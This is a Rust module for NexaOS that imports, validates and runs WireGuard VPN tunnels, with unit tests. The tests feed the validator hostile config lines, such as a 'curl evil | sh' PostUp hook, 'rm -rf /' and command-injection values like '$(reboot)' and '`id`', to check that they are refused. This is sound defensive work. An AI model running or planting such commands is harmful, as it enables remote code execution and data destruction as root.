//! WireGuard VPNs. Tunnel files live in /etc/wireguard (root only) and are
//! handed to wg-quick as root, which runs PreUp/PostUp/PreDown/PostDown
//! lines as shell commands. So imports are strict: only plain tunnel
//! settings, every value checked, anything else refused with a reason.
//! DNS servers are kept beside the file and applied here (NexaOS has no
//! resolvconf); the previous /etc/resolv.conf comes back when it goes down.

use serde_json::{json, Value};
use std::fs;
use std::net::IpAddr;
use std::os::unix::fs::OpenOptionsExt;
use std::path::Path;
use std::process::Command;

const INTERFACE_KEYS: &[&str] = &["privatekey", "address", "listenport", "dns", "mtu", "table", "fwmark"];
const PEER_KEYS: &[&str] = &["publickey", "presharedkey", "allowedips", "endpoint", "persistentkeepalive"];
const SCRIPT_KEYS: &[&str] = &["preup", "postup", "predown", "postdown", "saveconfig"];
const CANONICAL: &[(&str, &str)] = &[
    ("privatekey", "PrivateKey"), ("address", "Address"), ("listenport", "ListenPort"), ("dns", "DNS"),
    ("mtu", "MTU"), ("table", "Table"), ("fwmark", "FwMark"), ("publickey", "PublicKey"),
    ("presharedkey", "PresharedKey"), ("allowedips", "AllowedIPs"), ("endpoint", "Endpoint"),
    ("persistentkeepalive", "PersistentKeepalive"),
];

fn b64_len(s: &str) -> Option<usize> {
    let s = s.trim();
    if s.is_empty() || s.len() % 4 != 0 {
        return None;
    }
    let pad = s.bytes().rev().take_while(|b| *b == b'=').count();
    if pad > 2 || !s.bytes().take(s.len() - pad).all(|b| b.is_ascii_alphanumeric() || b == b'+' || b == b'/') {
        return None;
    }
    Some(s.len() / 4 * 3 - pad)
}

fn key(v: &str, what: &str) -> Result<(), String> {
    if b64_len(v) == Some(32) { Ok(()) } else { Err(format!("{what} isn't a valid WireGuard key.")) }
}

fn cidr(part: &str) -> bool {
    let (ip, prefix) = part.split_once('/').unwrap_or((part, ""));
    match ip.parse::<IpAddr>() {
        Ok(addr) => prefix.is_empty() || prefix.parse::<u8>().map_or(false, |p| p <= if addr.is_ipv4() { 32 } else { 128 }),
        Err(_) => false,
    }
}

fn addresses(v: &str, what: &str) -> Result<(), String> {
    for p in v.split(',').map(str::trim) {
        if !cidr(p) {
            return Err(format!("{what}: '{p}' isn't an IP address."));
        }
    }
    Ok(())
}

fn number(v: &str, max: u64) -> bool {
    v.parse::<u64>().map_or(false, |n| n <= max)
}

/// (clean config text, DNS servers), or why the file can't be used.
pub fn validate(text: &str) -> Result<(String, Vec<String>), String> {
    let mut sections: Vec<(String, Vec<(String, String)>)> = Vec::new();
    for (n, raw) in text.lines().enumerate() {
        let n = n + 1;
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        if let Some(name) = line.strip_prefix('[').and_then(|l| l.strip_suffix(']')) {
            let kind = name.to_ascii_lowercase();
            if kind != "interface" && kind != "peer" {
                return Err(format!("Line {n}: unknown section [{name}]."));
            }
            sections.push((kind, Vec::new()));
            continue;
        }
        let Some((k, v)) = line.split_once('=') else { return Err(format!("Line {n} isn't a WireGuard setting.")) };
        let (k, v) = (k.trim().to_ascii_lowercase(), v.trim().to_string());
        let Some(section) = sections.last_mut() else { return Err(format!("Line {n} isn't a WireGuard setting.")) };
        if SCRIPT_KEYS.contains(&k.as_str()) {
            return Err(format!("This file runs commands ({}), which NexaOS doesn't allow in VPN files.", k));
        }
        let allowed = if section.0 == "interface" { INTERFACE_KEYS } else { PEER_KEYS };
        if !allowed.contains(&k.as_str()) {
            return Err(format!("Line {n}: '{}' isn't allowed in [{}].", line.split('=').next().unwrap_or("").trim(),
                               if section.0 == "interface" { "Interface" } else { "Peer" }));
        }
        // Every value is checked; wg-quick passes them to ip/wg as root.
        let ok = match k.as_str() {
            "listenport" => number(&v, 65535),
            "mtu" => number(&v, 9000),
            "persistentkeepalive" => v == "off" || number(&v, 65535),
            "table" => v == "off" || v == "auto" || number(&v, u32::MAX as u64),
            "fwmark" => v == "off" || number(&v, u32::MAX as u64) || v.strip_prefix("0x").map_or(false, |h| u32::from_str_radix(h, 16).is_ok()),
            _ => !v.contains(['$', '`', ';', '|', '&', '<', '>', '\\', '"', '\'']),
        };
        if !ok {
            return Err(format!("Line {n}: '{v}' isn't a valid value here."));
        }
        section.1.push((k, v));
    }
    let interfaces: Vec<_> = sections.iter().filter(|s| s.0 == "interface").collect();
    let peers: Vec<_> = sections.iter().filter(|s| s.0 == "peer").collect();
    if interfaces.len() != 1 {
        return Err("A WireGuard file needs exactly one [Interface] section.".into());
    }
    if peers.is_empty() {
        return Err("A WireGuard file needs at least one [Peer] (the VPN server).".into());
    }
    let get = |items: &Vec<(String, String)>, k: &str| items.iter().find(|(x, _)| x == k).map(|(_, v)| v.clone());
    let iface = &interfaces[0].1;
    let (Some(pk), Some(addr)) = (get(iface, "privatekey"), get(iface, "address")) else {
        return Err("[Interface] needs a PrivateKey and an Address.".into());
    };
    key(&pk, "PrivateKey")?;
    addresses(&addr, "Address")?;
    for p in &peers {
        let Some(pubk) = get(&p.1, "publickey") else { return Err("Every [Peer] needs a PublicKey.".into()) };
        key(&pubk, "PublicKey")?;
        if let Some(psk) = get(&p.1, "presharedkey") {
            key(&psk, "PresharedKey")?;
        }
        if let Some(a) = get(&p.1, "allowedips") {
            addresses(&a, "AllowedIPs")?;
        }
        if let Some(e) = get(&p.1, "endpoint") {
            let ok = e.rsplit_once(':').map_or(false, |(host, port)| {
                number(port, 65535) && !host.is_empty()
                    && (host.starts_with('[') && host.ends_with(']') && host[1..host.len() - 1].parse::<std::net::Ipv6Addr>().is_ok()
                        || host.chars().all(|c| c.is_ascii_alphanumeric() || ".-".contains(c)))
            });
            if !ok {
                return Err(format!("Endpoint '{e}' should look like host:port."));
            }
        }
    }
    let mut dns = Vec::new();
    let mut out = Vec::new();
    for (kind, items) in &sections {
        out.push(format!("[{}]", if kind == "interface" { "Interface" } else { "Peer" }));
        for (k, v) in items {
            if k == "dns" {
                // Search domains are ignored; only server addresses are kept.
                dns.extend(v.split(',').map(str::trim).filter_map(|d| d.parse::<IpAddr>().ok()).map(|d| d.to_string()));
                continue;
            }
            let name = CANONICAL.iter().find(|(l, _)| l == k).map(|(_, c)| *c).unwrap_or(k);
            out.push(format!("{name} = {v}"));
        }
        out.push(String::new());
    }
    Ok((out.join("\n"), dns))
}

// ---- the tunnels

pub struct Paths<'a> {
    pub wg: &'a Path,
    pub resolv: &'a Path,
    pub backup: &'a Path,
}

fn active() -> Vec<String> {
    let out = Command::new("ip").args(["-o", "link", "show", "type", "wireguard"]).output().map(|o| o.stdout).unwrap_or_default();
    String::from_utf8_lossy(&out).lines()
        .filter_map(|l| l.split(':').nth(1)).map(|n| n.trim().split('@').next().unwrap_or("").to_string()).collect()
}

fn tunnels(p: &Paths) -> Vec<String> {
    let mut v: Vec<String> = fs::read_dir(p.wg).into_iter().flatten().flatten()
        .filter_map(|e| e.file_name().to_str().and_then(|n| n.strip_suffix(".conf")).map(str::to_string)).collect();
    v.sort();
    v
}

fn wg_quick(dir: &str, name: &str) -> Result<(), String> {
    let out = Command::new("wg-quick").args([dir, name]).stdin(std::process::Stdio::null()).output()
        .map_err(|e| format!("couldn't run wg-quick: {e}"))?;
    if out.status.success() {
        return Ok(());
    }
    let text = String::from_utf8_lossy(&out.stderr).to_string() + &String::from_utf8_lossy(&out.stdout);
    Err(text.lines().filter(|l| !l.trim().is_empty() && !l.starts_with("[#]")).last().unwrap_or("wg-quick failed").to_string())
}

fn write_private(path: &Path, body: &str) -> Result<(), String> {
    let tmp = path.with_extension("tmp");
    fs::OpenOptions::new().write(true).create(true).truncate(true).mode(0o600).open(&tmp)
        .and_then(|mut f| std::io::Write::write_all(&mut f, body.as_bytes())).map_err(|e| e.to_string())?;
    fs::rename(&tmp, path).map_err(|e| e.to_string())
}

fn restore_dns(p: &Paths) {
    if let Ok(saved) = fs::read(p.backup) {
        // Copied, not renamed: /run and /etc are different filesystems.
        let _ = fs::write(p.resolv, saved);
        let _ = fs::remove_file(p.backup);
    }
}

pub fn list(p: &Paths) -> Value {
    let up = active();
    json!({"tunnels": tunnels(p).iter().map(|n| json!({"name": n, "active": up.contains(n)})).collect::<Vec<_>>()})
}

pub fn import(p: &Paths, name: &str, config: &str) -> Result<Value, String> {
    let (clean, dns) = validate(config)?;
    fs::create_dir_all(p.wg).map_err(|e| e.to_string())?;
    let _ = fs::set_permissions(p.wg, std::os::unix::fs::PermissionsExt::from_mode(0o700));
    write_private(&p.wg.join(format!("{name}.conf")), &clean)?;
    write_private(&p.wg.join(format!("{name}.dns")), &serde_json::to_string(&dns).unwrap())?;
    Ok(json!({"done": format!("Added the VPN {name}"), "name": name}))
}

pub fn down(p: &Paths, name: &str) -> Result<Value, String> {
    if active().iter().any(|a| a == name) {
        wg_quick("down", name)?;
    }
    restore_dns(p);
    Ok(json!({"done": format!("Disconnected {name}")}))
}

pub fn up(p: &Paths, name: &str) -> Result<Value, String> {
    let all = tunnels(p);
    if !all.iter().any(|t| t == name) {
        return Err("No such VPN.".into());
    }
    for other in active().into_iter().filter(|a| a != name && all.contains(a)) {
        let _ = wg_quick("down", &other); // one VPN at a time
    }
    if !active().iter().any(|a| a == name) {
        wg_quick("up", name)?;
    }
    let dns: Vec<String> = fs::read_to_string(p.wg.join(format!("{name}.dns"))).ok()
        .and_then(|s| serde_json::from_str::<Vec<String>>(&s).ok()).unwrap_or_default()
        .into_iter().filter(|d| d.parse::<IpAddr>().is_ok()).collect();
    if !dns.is_empty() {
        if let Some(dir) = p.backup.parent() {
            let _ = fs::create_dir_all(dir);
        }
        if !p.backup.exists() {
            if let Ok(cur) = fs::read(p.resolv) {
                let _ = fs::write(p.backup, cur);
            }
        }
        let body = format!("# set by NexaOS VPN '{name}'\n") + &dns.iter().map(|d| format!("nameserver {d}\n")).collect::<String>();
        fs::write(p.resolv, body).map_err(|e| e.to_string())?;
    }
    Ok(json!({"done": format!("Connected {name}")}))
}

pub fn remove(p: &Paths, name: &str) -> Result<Value, String> {
    down(p, name)?;
    for ext in ["conf", "dns"] {
        let _ = fs::remove_file(p.wg.join(format!("{name}.{ext}")));
    }
    Ok(json!({"done": format!("Removed the VPN {name}")}))
}

#[cfg(test)]
mod tests {
    use super::*;

    const KEY: &str = "YAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=";
    fn conf(extra_iface: &str) -> String {
        format!("[Interface]\nPrivateKey = {KEY}\nAddress = 10.2.0.2/32, fd00::2/128\nDNS = 10.2.0.1, corp.example\n{extra_iface}\n\
                 [Peer]\nPublicKey = {KEY}\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = vpn.example.com:51820\n")
    }

    #[test]
    fn a_plain_tunnel_is_cleaned_up() {
        let (clean, dns) = validate(&conf("MTU = 1420")).unwrap();
        assert_eq!(dns, vec!["10.2.0.1"]);
        assert!(clean.contains("[Interface]\nPrivateKey = ") && clean.contains("MTU = 1420") && !clean.contains("DNS"), "{clean}");
    }

    #[test]
    fn commands_and_tricks_are_refused() {
        for (extra, why) in [
            ("PostUp = curl evil | sh", "runs commands"),
            ("preup=rm -rf /", "runs commands"),
            ("SaveConfig = true", "runs commands"),
            ("Table = $(reboot)", "valid value"),
            ("MTU = 1420; reboot", "valid value"),
            ("FwMark = `id`", "valid value"),
            ("Foo = bar", "isn't allowed"),
        ] {
            let err = validate(&conf(extra)).unwrap_err();
            assert!(err.contains(why), "{extra}: {err}");
        }
        assert!(validate(&conf("").replace(KEY, "short")).unwrap_err().contains("valid WireGuard key"));
        assert!(validate(&conf("").replace("10.2.0.2/32", "10.2.0.2/99")).unwrap_err().contains("isn't an IP address"));
        assert!(validate(&conf("").replace("vpn.example.com:51820", "vpn example:1")).unwrap_err().contains("host:port"));
        assert!(validate("[Interface]\nPrivateKey = x\n").is_err());
    }

    /// Fake wg-quick and ip that keep the "up" tunnels in a state file.
    fn fake_tools(dir: &Path) {
        use std::os::unix::fs::PermissionsExt;
        let state = dir.join("up");
        fs::write(&state, "").unwrap();
        let wg = format!("#!/bin/sh\nS={}\nif [ \"$1\" = up ]; then echo \"$2\" >> $S; else grep -vx \"$2\" $S > $S.n; mv $S.n $S; fi\n", state.display());
        let ip = format!("#!/bin/sh\nn=1; while read t; do echo \"$n: $t: <POINTOPOINT,UP> mtu 1420\"; n=$((n+1)); done < {}\n", state.display());
        for (name, body) in [("wg-quick", wg), ("ip", ip)] {
            fs::write(dir.join(name), body).unwrap();
            fs::set_permissions(dir.join(name), fs::Permissions::from_mode(0o755)).unwrap();
        }
        let path = format!("{}:{}", dir.display(), std::env::var("PATH").unwrap_or_default());
        std::env::set_var("PATH", path);
    }

    #[test]
    fn up_switch_down_with_dns() {
        let d = std::env::temp_dir().join(format!("nexa-broker-vpnup-{}", std::process::id()));
        let _ = fs::remove_dir_all(&d);
        fs::create_dir_all(d.join("bin")).unwrap();
        fake_tools(&d.join("bin"));
        let p = Paths { wg: &d.join("wireguard"), resolv: &d.join("resolv.conf"), backup: &d.join("run/backup") };
        fs::write(p.resolv, "nameserver 192.168.1.1\n").unwrap();
        import(&p, "sweden", &conf("")).unwrap();
        import(&p, "home", &conf("").replace("DNS = 10.2.0.1, corp.example\n", "")).unwrap();
        up(&p, "sweden").unwrap();
        assert_eq!(active(), vec!["sweden"]);
        assert!(fs::read_to_string(p.resolv).unwrap().contains("nameserver 10.2.0.1"), "VPN DNS in use");
        assert_eq!(fs::read_to_string(p.backup).unwrap(), "nameserver 192.168.1.1\n", "old DNS kept aside");
        up(&p, "home").unwrap();
        assert_eq!(active(), vec!["home"], "one VPN at a time");
        assert!(up(&p, "nope").is_err());
        down(&p, "home").unwrap();
        assert!(active().is_empty());
        assert_eq!(fs::read_to_string(p.resolv).unwrap(), "nameserver 192.168.1.1\n", "original DNS back");
    }

    #[test]
    fn import_writes_root_only_files() {
        let d = std::env::temp_dir().join(format!("nexa-broker-vpn-{}", std::process::id()));
        let _ = fs::remove_dir_all(&d);
        let p = Paths { wg: &d.join("wireguard"), resolv: &d.join("resolv.conf"), backup: &d.join("run/backup") };
        import(&p, "home", &conf("")).unwrap();
        let md = fs::metadata(d.join("wireguard/home.conf")).unwrap();
        assert_eq!(std::os::unix::fs::PermissionsExt::mode(&md.permissions()) & 0o777, 0o600);
        assert_eq!(fs::read_to_string(d.join("wireguard/home.dns")).unwrap(), "[\"10.2.0.1\"]");
        assert_eq!(list(&p)["tunnels"][0]["name"], "home");
        remove(&p, "home").unwrap();
        assert!(!d.join("wireguard/home.conf").exists());
    }
}
